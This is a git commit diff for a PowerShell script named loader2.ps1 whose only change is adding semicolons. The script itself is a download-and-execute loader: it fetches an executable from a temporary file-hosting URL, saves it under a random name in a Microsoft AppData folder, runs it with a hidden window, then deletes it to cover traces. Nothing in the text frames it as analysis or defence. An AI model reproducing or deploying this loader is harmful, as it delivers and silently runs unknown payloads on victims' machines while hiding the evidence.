aaf8969b0d417d763900a448c263152016cdc327
xxuavails <hfigo6441@gmail.com>
2025-09-19 20:09:09 +0300

    Update loader2.ps1

--- loader2.ps1
+++ loader2.ps1
@@ -1,14 +1,15 @@
-$exeUrl = "http://tmpfiles.org/dl/1222307/mes.exe"
-$tmpPath = "$env:USERPROFILE\AppData\Local\Microsoft\$(New-Guid).exe"
+$exeUrl = "http://tmpfiles.org/dl/1222307/mes.exe";
+$tmpPath = "$env:USERPROFILE\AppData\Local\Microsoft\$(New-Guid).exe";
 
 try {
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile($exeUrl, $tmpPath)
+    $wc = New-Object System.Net.WebClient;
+    $wc.DownloadFile($exeUrl, $tmpPath);
 
-    $p = Start-Process -FilePath $tmpPath -WindowStyle Hidden -PassThru
-    $p.WaitForExit()
+    $p = Start-Process -FilePath $tmpPath -WindowStyle Hidden -PassThru;
+    $p.WaitForExit();
 
-    Remove-Item $tmpPath -Force -ErrorAction SilentlyContinue
+    Remove-Item $tmpPath -Force -ErrorAction SilentlyContinue;
 } catch {
-    Write-Error "Execution failed: $_"
+    Write-Error "Execution failed: $_";
 }
+
